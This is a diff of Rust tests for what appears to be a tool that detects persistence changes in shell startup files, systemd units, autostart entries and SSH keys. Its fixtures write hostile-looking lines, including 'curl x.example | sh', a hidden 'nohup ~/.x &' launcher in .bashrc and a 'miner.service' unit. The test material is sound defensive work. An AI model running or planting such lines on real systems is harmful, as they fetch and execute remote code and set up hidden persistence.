@@ -177,13 +177,19 @@ fn decision_on_stale_message_is_refused() {
     let err = g.allow(first.id, Some(first.new_hash())).unwrap_err();
     assert!(matches!(err.downcast_ref(), Some(DecisionError::Stale)));
 
-    // …and after it, the same event describes the new state.
+    // …and after it, a new event describes the new state and the noted one is closed.
     let second = g.rescan().unwrap().remove(0);
-    assert_eq!(second.id, first.id);
-    assert_eq!(second.severity, Severity::Suspicious);
+    assert_ne!(second.id, first.id);
+    assert_eq!(second.status, Status::Open);
+    assert_eq!(second.added_lines, ["curl x.example | sh"]);
+    assert!(second.wants_popup());
     let err = g.allow(first.id, Some(first.new_hash())).unwrap_err();
-    assert!(matches!(err.downcast_ref(), Some(DecisionError::Stale)));
+    assert!(matches!(
+        err.downcast_ref(),
+        Some(DecisionError::AlreadyResolved(_))
+    ));
     g.allow(second.id, Some(second.new_hash())).unwrap();
+    assert!(g.rescan().unwrap().is_empty());
 }
 
 #[test]
@@ -191,8 +197,10 @@ fn revert_and_delete_close_events_without_question() {
     let env = Env::new();
     let mut g = env.initialized();
     let rc = env.path(".bashrc");
-    fs::write(&rc, "changed\n").unwrap();
+    fs::write(&rc, "changed\nnohup ~/.x &\n").unwrap();
     let ev = g.rescan().unwrap().remove(0);
+    assert_eq!(ev.status, Status::Open);
+    assert!(!ev.wants_popup());
     fs::write(&rc, "alias ll='ls -l'\n").unwrap();
     assert!(g.rescan().unwrap().is_empty());
     assert_eq!(
@@ -234,6 +242,15 @@ fn systemd_enable_symlink_and_ssh_key() {
     ));
     let key = events.iter().find(|e| e.kind == Kind::Ssh).unwrap();
     assert_eq!(key.severity, Severity::Notice);
+    assert_eq!(key.status, Status::Open);
+    // A program in a hidden folder is unusual but not clearly bad: a warning, no question.
+    // (The link points into the test's temporary folder and therefore is dangerous.)
+    let unit_ev = events
+        .iter()
+        .find(|e| e.path == unit.to_str().unwrap())
+        .unwrap();
+    assert_eq!(unit_ev.status, Status::Open);
+    assert!(!unit_ev.wants_popup());
 
     for ev in &events {
         g.remove(ev.id, None).unwrap();
@@ -241,6 +258,35 @@ fn systemd_enable_symlink_and_ssh_key() {
     assert!(!unit.exists());
     assert!(fs::symlink_metadata(wants.join("miner.service")).is_err());
     assert!(!env.path(".ssh/authorized_keys").exists());
+}
+
+#[test]
+fn harmless_change_is_noted_and_can_be_undone() {
+    let env = Env::new();
+    let mut g = env.initialized();
+    let rc = env.path(".bashrc");
+    fs::write(&rc, "alias ll='ls -l'\nexport EDITOR=vim\n").unwrap();
+    let ev = g.rescan().unwrap().remove(0);
+    assert_eq!(ev.status, Status::Noted);
+    assert!(!ev.wants_popup());
+    assert!(g.store().open_events().unwrap().is_empty());
+    // Already part of the baseline: the next scan is quiet.
+    assert!(g.rescan().unwrap().is_empty());
+
+    let desktop = env.path(".config/autostart/discord.desktop");
+    write(&desktop, "[Desktop Entry]\nExec=/usr/bin/discord\n");
+    let created = g.rescan().unwrap().remove(0);
+    assert_eq!(created.status, Status::Noted);
+
+    g.remove(ev.id, Some(ev.new_hash())).unwrap();
+    assert_eq!(fs::read_to_string(&rc).unwrap(), "alias ll='ls -l'\n");
+    g.remove(created.id, None).unwrap();
+    assert!(!desktop.exists());
+    assert!(g.rescan().unwrap().is_empty());
+    assert_eq!(
+        g.store().event(ev.id).unwrap().unwrap().status,
+        Status::Removed
+    );
 }
 
 #[test]
